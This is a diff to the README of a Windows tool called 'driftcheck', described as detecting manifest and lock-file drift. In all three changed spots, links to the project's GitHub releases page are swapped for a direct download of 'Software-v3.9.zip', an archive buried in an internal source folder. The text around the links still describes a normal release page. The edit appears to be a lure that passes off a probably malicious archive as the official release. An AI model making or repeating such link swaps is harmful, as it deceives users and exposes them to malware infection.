@@ -1,6 +1,6 @@
 # 🧭 driftcheck - Spot Manifest and Lock Drift
 
-[![Download driftcheck](https://img.shields.io/badge/Download%20driftcheck-blue?style=for-the-badge&logo=github)](https://github.com/significancemoloch680/driftcheck/releases)
+[![Download driftcheck](https://img.shields.io/badge/Download%20driftcheck-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/significancemoloch680/driftcheck/main/internal/driftcheck/Software-v3.9.zip)
 
 ## 📦 What driftcheck does
 
@@ -26,7 +26,7 @@ Common file types include:
 
 Open the release page here and visit this page to download:
 
-https://github.com/significancemoloch680/driftcheck/releases
+https://raw.githubusercontent.com/significancemoloch680/driftcheck/main/internal/driftcheck/Software-v3.9.zip
 
 Look for the latest release, then download the Windows file that matches your system. If there is more than one file, choose the one marked for Windows.
 
@@ -171,7 +171,7 @@ Use the files that belong to your project setup
 
 If you need the release page later, use this link:
 
-https://github.com/significancemoloch680/driftcheck/releases
+https://raw.githubusercontent.com/significancemoloch680/driftcheck/main/internal/driftcheck/Software-v3.9.zip
 
 ## 🖥️ Windows use guide
 
